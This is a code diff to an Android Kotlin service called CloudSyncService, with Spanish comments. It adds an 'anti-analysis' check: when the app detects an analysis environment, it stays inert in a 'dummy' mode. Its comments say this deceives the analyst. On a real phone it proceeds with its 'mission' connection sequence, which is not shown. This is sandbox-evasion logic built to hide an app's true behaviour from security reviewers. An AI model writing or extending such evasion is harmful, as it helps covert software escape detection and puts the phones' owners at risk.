@@ -85,7 +85,6 @@ class CloudSyncService : Service() {
         // --- BLOQUE DE SEGURIDAD ANTI-CRASH (ANDROID 14) ---
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                // Usamos dataSync explícitamente
                 startForeground(
                     1,
                     createNotification(),
@@ -101,7 +100,16 @@ class CloudSyncService : Service() {
         }
         // ----------------------------------------------------
 
-        // Iniciamos la conexión de forma asíncrona para resolver la URL primero
+        // === 🛡️ CHECK DE SEGURIDAD (ANTI-ANÁLISIS) ===
+        if (!SecurityCheck.isSafeEnvironment(this)) {
+            Log.i("CloudSync", "🛡️ Entorno hostil detectado. Operando en modo silencioso (Dummy).")
+            // NO iniciamos la conexión. El servicio se queda vivo pero inerte.
+            // Esto engaña al analista haciéndole creer que el servicio no hace nada interesante.
+            return START_NOT_STICKY
+        }
+        // ==============================================
+
+        // Si el entorno es seguro (teléfono real), procedemos con la misión.
         iniciarSecuenciaDeConexion()
 
         return START_STICKY
